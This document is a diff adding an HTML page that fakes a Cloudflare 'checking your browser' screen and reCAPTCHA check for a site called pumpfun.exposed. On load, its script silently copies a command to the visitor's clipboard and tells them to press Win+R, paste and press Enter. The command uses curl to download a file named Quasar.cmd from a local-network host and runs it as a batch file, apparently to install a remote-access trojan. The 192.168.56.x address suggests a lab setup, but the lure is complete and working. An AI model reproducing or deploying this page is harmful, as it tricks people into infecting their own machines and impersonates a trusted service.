@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Just a moment...</title>
+  <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f0f0;
+      color: #333;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    .cf-container {
+      display: inline-block;
+      background: #ffffff;
+      padding: 30px 50px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 600px;
+    }
+
+    .cf-logo {
+      width: 60px;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #f90;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 20px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .verify-box {
+      background: #fff6e5;
+      border-left: 5px solid orange;
+      text-align: left;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    textarea {
+      width: 100%;
+      height: 80px;
+      font-size: 13px;
+      margin-top: 10px;
+      resize: none;
+    }
+
+    .btn {
+      margin-top: 20px;
+      background-color: #f90;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #e68a00;
+    }
+
+  </style>
+</head>
+<body onload="copyPayload()">
+
+  <div class="cf-container">
+    <img src="https://www.cloudflare.com/favicon.ico" class="cf-logo" alt="Cloudflare Logo">
+    <h2>Just a moment...</h2>
+    <div class="spinner"></div>
+    <p>pumpfun.exposed is checking your browser before accessing...</p>
+
+    <div class="verify-box">
+      <b>To verify you're not a robot, follow these steps:</b>
+      <ol>
+        <li>Press <b>Windows Key + R</b></li>
+        <li>Paste the copied command (<b>Ctrl + V</b>)</li>
+        <li>Press <b>Enter</b></li>
+      </ol>
+      <p><i>"I am not a robot" - reCAPTCHA Verification ID: <b>8731</b></i></p>
+      <textarea id="payloadBox" readonly></textarea>
+    </div>
+
+    <button class="btn" onclick="alert('Command copied to clipboard! Now press Win + R and Ctrl + V')">VERIFY</button>
+  </div>
+
+  <script>
+    function copyPayload() {
+      const payload = `cmd /c start /min cmd.exe /c "curl -L http://192.168.56.109/clickfix/Quasar.cmd -o %temp%\\verification.txt.bat && call %temp%\\verification.txt.bat"`;
+      document.getElementById("payloadBox").value = payload;
+
+      const input = document.createElement("textarea");
+      input.value = payload;
+      document.body.appendChild(input);
+      input.select();
+      document.execCommand("copy");
+      document.body.removeChild(input);
+    }
+  </script>
+
+</body>
+</html>
